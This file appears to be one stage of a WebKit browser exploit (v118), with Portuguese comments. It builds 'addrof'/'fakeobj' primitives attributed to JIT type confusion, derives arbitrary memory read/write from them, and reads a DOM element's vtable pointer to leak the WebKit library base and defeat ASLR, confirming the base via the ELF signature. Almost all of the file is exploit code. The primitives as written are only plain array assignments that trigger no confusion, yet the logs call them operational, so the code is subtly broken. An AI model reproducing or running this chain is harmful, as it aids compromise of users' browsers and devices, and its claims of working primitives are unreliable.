// js/script3/testArrayBufferVictimCrash.mjs (v118 - Verificação e Vazamento WebKit)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - Adicionada a FASE 4, que utiliza as primitivas de L/E verificadas para vazar o
//   endereço base da biblioteca WebKit.
// - A nova fase usa um objeto DOM como alvo para vazar um ponteiro da vtable.
// - O endereço base do WebKit é calculado por alinhamento e verificado lendo a
//   assinatura ELF no cabeçalho da biblioteca.
// - Logs verbosos foram adicionados em todas as etapas para um rastreamento claro.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_v118_WebKit_Leak";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação de Primitivas e Vazamento da Base do WebKit ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Estabelecer Primitivas 'addrof' e 'fakeobj' via JIT-Confusion ---
        logS3("--- FASE 1: Configurando primitivas via JIT Type Confusion... ---", "subtest");
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 2: Construir Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 2: Construindo L/E arbitrária... ---", "subtest");
        const leaker_obj = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker_obj);
        const arb_read = (addr) => {
            leaker_obj.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker_obj.val_prop);
        };
        const arb_write = (addr, value) => {
            leaker_obj.obj_prop = fakeobj(addr);
            leaker_obj.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de L/E arbitrária construídas.", "good");

        // --- FASE 3: Verificação Funcional com Logs Verbosos ---
        logS3("--- FASE 3: Verificando a funcionalidade de L/E... ---", "subtest");
        const test_obj = { prop_a: 0xDEADBEEF, prop_b: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        const value_to_write = new AdvancedInt64(0x11223344, 0x55667788);
        
        logS3(`[VERIFICAÇÃO] Endereço do objeto de teste: ${toHex(test_obj_addr)}`, "info");
        logS3(`[VERIFICAÇÃO] Endereço da propriedade 'a': ${toHex(prop_a_addr)}`, "info");
        logS3(`[VERIFICAÇÃO] Escrevendo o valor de teste: ${toHex(value_to_write)}`, "info");
        arb_write(prop_a_addr, value_to_write);

        const value_read = arb_read(prop_a_addr);
        logS3(`[VERIFICAÇÃO] Valor lido de volta: ${toHex(value_read)}`, "leak");
        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
        }
        logS3("[VERIFICAÇÃO] SUCESSO! A verificação de L/E foi bem-sucedida!", "good");

        // --- FASE 4: Vazamento da Base do WebKit ---
        logS3("--- FASE 4: Tentando vazar a base da biblioteca WebKit... ---", "subtest");
        const div_element = document.createElement('div');
        const div_addr = addrof(div_element);
        logS3(`[LEAK] Endereço do objeto DOM 'div': ${toHex(div_addr)}`, "leak");

        const vtable_ptr = arb_read(div_addr); // Lê os primeiros 8 bytes (offset 0)
        logS3(`[LEAK] Ponteiro da Vtable lido do objeto: ${toHex(vtable_ptr)}`, "leak");
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable lido é nulo. Não é possível continuar.");
        }

        // Alinha o ponteiro para baixo para encontrar a base da biblioteca.
        // A máscara 0x3FFF alinha para 16KB, um valor comum para bibliotecas.
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not(); 
        const webkit_base = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[LEAK] Endereço base do WebKit (candidato): ${toHex(webkit_base)}`, "leak");

        logS3(`[LEAK] Lendo os primeiros 4 bytes de ${toHex(webkit_base)} para verificar a assinatura ELF...`, "info");
        const elf_magic = arb_read(webkit_base).low(); // Lê 8 bytes, mas só nos importam os 4 inferiores
        logS3(`[LEAK] Assinatura ELF lida: ${toHex(elf_magic)}`, "leak");

        if (elf_magic === 0x464C457F) { // 0x7F 'E' 'L' 'F'
            logS3("++++++++++++ SUCESSO FINAL! A assinatura ELF foi encontrada! ++++++++++++", "vuln");
            logS3(`O endereço base do WebKit foi vazado com sucesso: ${toHex(webkit_base)}`, "vuln");
            final_result = {
                success: true,
                message: `Bypass de ASLR bem-sucedido. Base do WebKit: ${toHex(webkit_base)}`
            };
        } else {
            throw new Error(`Assinatura ELF não encontrada no endereço base candidato. Lido: ${toHex(elf_magic)}`);
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
